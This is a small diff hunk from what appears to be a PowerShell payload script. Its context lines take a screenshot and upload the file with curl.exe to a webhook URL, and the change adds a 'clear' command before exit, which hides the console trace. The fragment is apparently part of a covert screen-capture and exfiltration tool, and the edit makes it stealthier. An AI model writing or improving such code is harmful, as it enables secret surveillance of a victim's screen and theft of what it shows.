@@ -125,4 +125,5 @@ TakeScreenshot -FilePath $FilePath
 if (-not ([string]::IsNullOrEmpty($FilePath))){
     curl.exe -F "file1=@$FilePath" $WebhookUrl
 }
+clear
 exit
